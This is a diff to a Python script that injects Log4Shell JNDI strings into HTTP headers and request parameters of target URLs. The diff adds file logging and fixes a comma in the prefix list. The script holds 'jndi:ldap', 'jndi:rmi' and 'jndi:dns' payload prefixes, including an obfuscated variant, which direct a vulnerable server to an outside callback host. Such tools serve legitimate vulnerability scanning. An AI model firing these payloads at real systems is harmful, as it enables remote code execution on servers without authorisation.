@@ -10,10 +10,16 @@ import sys
 import threading
 import queue
 from multiprocessing import Queue
+from datetime import datetime
 
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    level=logging.INFO, 
+    datefmt='%y-%m-%d %H:%M:%S',
+    format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s',
+    filename=f'./run/logs/{datetime.now().strftime("%y-%m%d--%H-%M-%S")}.log',
+    filemode='w')
 
 header_injects = [
     'X-Api-Version',
@@ -31,7 +37,7 @@ header_injects = [
 
 prefixes_injects = [
     'jndi:ldap',
-    'jndi:${lower:l}${lower:d}ap'
+    'jndi:${lower:l}${lower:d}ap',
     'jndi:rmi',
     'jndi:dns',
 ]
@@ -41,6 +47,7 @@ def get_payload(identifier, parameter, hostname, prefix_option: int):
 
 def perform_request(method: str, identifier: str, url: str, url_id: str, parameters: list, hostname: str, timeout: int, prefix_option: int):
     try:
+        logging.info(f"{identifier} : {url_id} : {url} - {method}")
         # Injects POST body parameters
         headers = {}
         for header in header_injects:
@@ -86,7 +93,7 @@ def perform_request(method: str, identifier: str, url: str, url_id: str, paramet
                 verify=False
             )
 
-        logging.info(f"{identifier} : {url_id} : {url} - {method} : {r.status_code}")
+        logging.info(f"Status code: {r.status_code}")
 
     except requests.exceptions.ConnectionError as e:
         logging.warning(f"{identifier} : {url_id} : {url} - {e}")
